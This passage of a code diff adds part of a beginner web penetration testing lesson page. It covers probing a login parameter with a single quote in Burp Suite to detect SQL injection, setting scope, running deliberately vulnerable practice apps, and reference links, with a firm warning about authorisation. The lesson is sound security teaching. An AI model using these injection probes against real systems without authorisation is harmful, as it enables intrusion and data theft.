+
+username=testuser&password=testpass
+
+# 4. Modify the username parameter:
+username=testuser'&password=testpass
+
+# 5. Click Send — check the response
+# 200 OK with "Welcome testuser'"? = probably safe
+# 500 Internal Server Error? = potentially injectable
+# MySQL error in the response body? = definitely injectable</code></pre>
+
+      <h3>Setting scope</h3>
+      <p>Without scope set, Burp logs traffic from every site your browser visits — Google, CDNs, analytics services. This clutter makes it impossible to work. Always set your scope first:</p>
+
+      <pre><code># In Burp: Target → Scope → Add Target Scope
+# Add your target URL: https://example.com
+
+# In Proxy → Options → "Intercept Client Requests"
+# Check: "And URL Is in target scope"
+# This filters out everything except your target — clean logs, clear focus.
+
+# Pro tip: right-click any host in the Target → Site Map panel
+# Select "Add to scope" — Burp will auto-filter for you</code></pre>
+
+      <h3>Practice targets — legally vulnerable apps</h3>
+      <p>You need something to practice on. These are deliberately vulnerable applications designed for exactly that:</p>
+
+      <pre><code># PortSwigger Web Security Academy (online, free, the gold standard)
+https://portswigger.net/web-security
+# Hundreds of labs covering every vulnerability type. Use Burp Community.
+
+# DVWA — Damn Vulnerable Web Application (run locally)
+# Docker: docker run -d -p 80:80 vulnerables/web-dvwa
+# Browser: http://localhost/dvwa
+
+# OWASP Juice Shop (more modern, harder)
+# Docker: docker run -d -p 3000:3000 bkimminich/juice-shop
+# Browser: http://localhost:3000
+
+# HackTheBox and TryHackMe (online, legal targets)
+https://hackthebox.com   # More advanced, gamified
+https://tryhackme.com    # More guided, great for beginners</code></pre>
+
+      <div class="callout warn"><strong>Scope discipline is career-defining:</strong> The golden rule of web app testing — practise only on systems you own, are explicitly authorised to test, or are specifically designed for learning (like the platforms above). Running Gobuster or Burp against a production site without a signed scope document is illegal in most jurisdictions, regardless of your intentions. Bug bounty programmes on platforms like HackerOne and Bugcrowd provide a legal, paid way to practice on real targets.</div>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="wrap">Wrap-up &amp; Resources</h2>
+
+      <p>You now carry the mental model of a web application security tester. Here's everything this module gave you, condensed:</p>
+
+      <pre><code">✓ Web App VAPT = Vulnerability Assessment + Penetration Testing on web apps
+✓ Black-box / Grey-box / White-box — three testing perspectives
+✓ HTTP is a conversation: every request and response is testable
+✓ Status codes, headers, cookies, and sessions are all attack surfaces
+✓ Passive recon: Google dorking, crt.sh, Shodan, Wappalyzer — no packets sent
+✓ Gobuster finds hidden directories and subdomains
+✓ Nikto gives a rapid automated baseline of common web vulnerabilities
+✓ The OWASP Top 10 defines the most critical web vulnerability categories
+✓ SQL injection: user input treated as database commands
+✓ XSS: attacker JavaScript injected into pages served to other users
+✓ Broken Access Control: users reaching things they shouldn't
+✓ Burp Suite: the universal web testing workbench — Proxy, Repeater, Intruder
+✓ Practice legally: Web Security Academy, DVWA, Juice Shop, TryHackMe</code></pre>
+
+      <h3>Essential references</h3>
+      <pre><code">OWASP Top 10 (2021)          – https://owasp.org/Top10/2021/
+OWASP Testing Guide (WSTG)  – https://owasp.org/www-project-web-security-testing-guide/
+PortSwigger Web Security     – https://portswigger.net/web-security
+Burp Suite Community         – https://portswigger.net/burp/communitydownload
+SecLists wordlists           – https://github.com/danielmiessler/SecLists
+Shodan                       – https://www.shodan.io
+SSL Labs (TLS checker)       – https://www.ssllabs.com/ssltest/
+Certificate Transparency     – https://crt.sh
+HackerOne (bug bounty)       – https://hackerone.com/bug-bounty-programs
+Bugcrowd (bug bounty)        – https://bugcrowd.com/programs</code></pre>
+
+      <h3>Practice environments</h3>
+      <pre><code">PortSwigger Web Security Academy  – https://portswigger.net/web-security
+TryHackMe                         – https://tryhackme.com
+Hack The Box                      – https://hackthebox.com
+DVWA (Docker)   docker run -d -p 80:80 vulnerables/web-dvwa
+Juice Shop      docker run -d -p 3000:3000 bkimminich/juice-shop</code></pre>
+
+      <div class="callout"><strong>What's next?</strong> In L1, you go hands-on — you'll exploit a real SQL injection to extract a credential database, chain an XSS into a session hijack, and bypass a broken access control check to read admin data. The concepts you've built here are the foundation. L1 is where they become skills.</div>
+
+      <p style="font-size:.85rem;color:var(--fade);">Use the <span class="accent-cyan">arrows in the navbar</span> to go deeper into this topic — or sign up to unlock L1–L3.</p>
     </article>
   </div>
 </div>
@@ -134,5 +675,36 @@ curl -i "https://lab.example/search?q=test'"   # does it break?
 
 <script src="../../assets/js/main.js"></script>
 <script src="../../assets/js/levels.js"></script>
+<script>
+(function () {
+  var sideLinks = document.querySelectorAll('.lesson-side a[href^="#"]');
+  if (!sideLinks.length) return;
+
+  var targets = Array.from(sideLinks).map(function (a) {
+    return document.querySelector(a.getAttribute('href'));
+  }).filter(Boolean);
+
+  var THRESHOLD = 100;
+
+  function setActive(id) {
+    sideLinks.forEach(function (a) {
+      a.classList.toggle('active', a.getAttribute('href') === '#' + id);
+    });
+  }
+
+  function update() {
+    var current = targets[0];
+    targets.forEach(function (el) {
+      if (el.getBoundingClientRect().top <= THRESHOLD) {
+        current = el;
+      }
+    });
+    setActive(current.id);
+  }
+
+  window.addEventListener('scroll', update, { passive: true });
+  update();
+})();
+</script>
 </body>
 </html>
